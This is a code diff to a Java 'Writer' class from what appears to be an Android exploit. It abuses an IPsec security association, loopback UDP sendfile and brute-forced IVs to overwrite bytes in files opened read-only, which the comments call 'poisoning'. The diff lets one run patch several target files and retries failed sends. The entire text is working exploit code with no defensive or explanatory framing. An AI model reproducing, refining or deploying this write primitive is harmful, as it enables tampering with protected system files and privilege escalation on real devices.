@@ -48,9 +48,10 @@ public class Writer {
     }
 
     static void run(String[] argv) throws Exception {
-        String path = argv[0];
-        byte[] spec = java.nio.file.Files.readAllBytes(new java.io.File(argv[1]).toPath());
-        int nrec = spec.length / 5;
+        // argv is one or more (targetfile, patchspec) PAIRS. One SA is staged and reused for all
+        // files, so batching several poisons into a single Writer invocation avoids repeated
+        // JVM + IpSec-SA startup cost.
+        int npairs = argv.length / 2;
 
         for (int i = 0; i < 20; i++) KEYMAT[i] = (byte) (0x41 + i);
         AES = Cipher.getInstance("AES/ECB/NoPadding");
@@ -84,53 +85,56 @@ public class Writer {
         // SA and every send then throws ECONNREFUSED -> the run aborts. Static ref pins them alive.
         KEEP = new Object[]{ svc, tok, enc, spiR, alg, cfg, tr };
         System.out.println("[*] writer SA status=" + fi(tr, "status") + " spi=0x" + Integer.toHexString(spi)
-                + " port=" + port + " recs=" + nrec);
+                + " port=" + port + " files=" + npairs);
 
         FileDescriptor sk = Os.socket(OsConstants.AF_INET, OsConstants.SOCK_DGRAM, 0);
         try { Os.setsockoptInt(sk, OsConstants.SOL_SOCKET, OsConstants.SO_SNDBUF, 4 << 20); } catch (Throwable t) {}
         Os.connect(sk, InetAddress.getByName("127.0.0.1"), port);
-        FileDescriptor f = Os.open(path, OsConstants.O_RDONLY, 0);
 
         int wrote = 0, skipped = 0;
         java.util.Random rnd = new java.util.Random(0x51C1L);
-        RandomAccessFile r = new RandomAccessFile(path, "r");
-        for (int k = 0; k < nrec; k++) {
-            long o = (spec[k*5] & 0xffL) | ((spec[k*5+1] & 0xffL)<<8)
-                   | ((spec[k*5+2] & 0xffL)<<16) | ((spec[k*5+3] & 0xffL)<<24);
-            int want = spec[k*5+4] & 0xff;
-            r.seek(o); int cur = r.read();
-            if (cur == want) { skipped++; continue; }
-            int need = (cur ^ want) & 0xff;
-            byte[] iv = new byte[8];
-            int n = 0;
-            while (true) { rnd.nextBytes(iv); n++; if (ks0(iv) == need) break;
-                           if (n > 2000000) throw new RuntimeException("no IV @"+o); }
-            byte[] hdr = new byte[16];
-            hdr[0]=(byte)(spi>>>24); hdr[1]=(byte)(spi>>>16); hdr[2]=(byte)(spi>>>8); hdr[3]=(byte)spi;
-            hdr[7]=1; System.arraycopy(iv,0,hdr,8,8);
-            // Resilient send: on a busy system the loopback UDP buffer can transiently fill (EAGAIN).
-            // Retry THIS record inline (flushing any corked partial first) instead of aborting the whole
-            // run — so the orchestrator never has to restart the JVM+SA. 1ms pacing between records.
-            int tries = 0;
-            while (true) {
-                try {
-                    Os.sendto(sk, hdr, 0, 16, MSG_MORE, null, 0);
-                    Os.sendfile(sk, f, new Int64Ref(o), 17);
-                    Os.sendto(sk, new byte[0], 0, 0, 0, null, 0);
-                    break;
-                } catch (android.system.ErrnoException e) {
-                    // Transient loopback/ESP errors right after boot: EAGAIN/ENOBUFS (buffer full) and
-                    // ECONNREFUSED (a queued async ICMP error on the connected UDP socket). All clear on
-                    // retry, so retry THIS record inline (bounded) instead of aborting the whole run.
-                    try { Os.sendto(sk, new byte[0], 0, 0, 0, null, 0); } catch (Throwable ignore) {} // flush cork
-                    if (++tries > 500) throw e;
-                    Thread.sleep(2);
+        for (int fidx = 0; fidx < npairs; fidx++) {
+            String path = argv[fidx*2];
+            byte[] spec = java.nio.file.Files.readAllBytes(new java.io.File(argv[fidx*2+1]).toPath());
+            int nrec = spec.length / 5;
+            FileDescriptor f = Os.open(path, OsConstants.O_RDONLY, 0);
+            RandomAccessFile r = new RandomAccessFile(path, "r");
+            for (int k = 0; k < nrec; k++) {
+                long o = (spec[k*5] & 0xffL) | ((spec[k*5+1] & 0xffL)<<8)
+                       | ((spec[k*5+2] & 0xffL)<<16) | ((spec[k*5+3] & 0xffL)<<24);
+                int want = spec[k*5+4] & 0xff;
+                r.seek(o); int cur = r.read();
+                if (cur == want) { skipped++; continue; }
+                int need = (cur ^ want) & 0xff;
+                byte[] iv = new byte[8];
+                int n = 0;
+                while (true) { rnd.nextBytes(iv); n++; if (ks0(iv) == need) break;
+                               if (n > 2000000) throw new RuntimeException("no IV @"+o); }
+                byte[] hdr = new byte[16];
+                hdr[0]=(byte)(spi>>>24); hdr[1]=(byte)(spi>>>16); hdr[2]=(byte)(spi>>>8); hdr[3]=(byte)spi;
+                hdr[7]=1; System.arraycopy(iv,0,hdr,8,8);
+                // Resilient send: on a busy system the loopback UDP buffer can transiently fill (EAGAIN)
+                // or a queued async ICMP error surfaces (ECONNREFUSED). Retry THIS record inline
+                // (flushing any corked partial first) instead of aborting the whole run.
+                int tries = 0;
+                while (true) {
+                    try {
+                        Os.sendto(sk, hdr, 0, 16, MSG_MORE, null, 0);
+                        Os.sendfile(sk, f, new Int64Ref(o), 17);
+                        Os.sendto(sk, new byte[0], 0, 0, 0, null, 0);
+                        break;
+                    } catch (android.system.ErrnoException e) {
+                        try { Os.sendto(sk, new byte[0], 0, 0, 0, null, 0); } catch (Throwable ignore) {}
+                        if (++tries > 500) throw e;
+                        Thread.sleep(2);
+                    }
                 }
+                Thread.sleep(1);   // pacing; the on-device ctor poisons sleeplessly, so 1ms is ample
+                wrote++;
             }
-            Thread.sleep(1);   // pacing; the on-device ctor poisons sleeplessly, so 1ms is ample
-            wrote++;
+            r.close();
+            Os.close(f);
         }
-        r.close();
         System.out.println("[+] wrote=" + wrote + " skipped=" + skipped);
     }
 }
